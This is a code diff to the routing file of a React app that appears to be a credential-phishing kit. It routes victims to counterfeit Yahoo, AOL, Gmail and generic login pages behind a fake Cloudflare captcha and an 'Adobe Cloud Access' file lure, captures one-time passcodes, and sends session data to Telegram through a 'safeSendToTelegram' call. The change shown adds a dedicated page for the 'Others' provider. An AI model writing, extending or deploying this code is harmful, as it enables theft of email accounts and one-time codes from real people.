@@ -6,6 +6,7 @@ import YahooLoginPage from './components/YahooLoginPage';
 import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
 import AolLoginPage from './components/AolLoginPage';
 import GmailLoginPage from './components/GmailLoginPage';
+import OthersLoginPage from './components/OthersLoginPage';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -167,7 +168,7 @@ function App() {
       <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <LoginComponent key="others-login" fileName="Adobe Cloud Access" defaultProvider="Others" onLoginSuccess={handleLoginSuccess} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersEmailSubmit} /> : <Navigate to={ROUTES.LANDING} replace />} />
+      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
